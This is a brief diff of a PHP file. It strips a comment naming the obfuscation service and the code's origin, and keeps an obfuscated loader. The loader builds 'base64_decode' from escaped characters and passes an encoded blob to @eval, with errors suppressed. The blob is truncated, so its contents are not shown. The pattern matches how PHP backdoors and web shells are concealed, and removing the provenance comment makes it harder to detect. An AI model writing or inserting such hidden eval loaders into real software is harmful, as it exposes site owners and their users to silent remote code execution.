@@ -1,9 +1,5 @@
 <?php
-/*
-Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
-This code was created on Saturday, February 10th, 2018 at 1:24 UTC from IP 36.72.197.193
-Checksum: 89aa5f47f60977927e512e95da7aff7ae93a927b
-*/
+
 $x3d023c8="\x62\x61\163\145\x36\x34\x5f\x64\x65\143\x6f\144\x65";@eval($x3d023c8(
 "Ly9OSXRlYzlEVVd5WURnaUZaZzFhMUc1YmxmRHNyQXFicFN4b3JXajhYQ2hQdTQ5amtsSi93R29ZL1dU
 YWVYNG5rcWZSQXYxSlpxV0oxZmtCQyt1emcvY3M0NExXUlROd2RkaUJoUXNwM0lGK3ZIVE5xdGNnWnc4Q
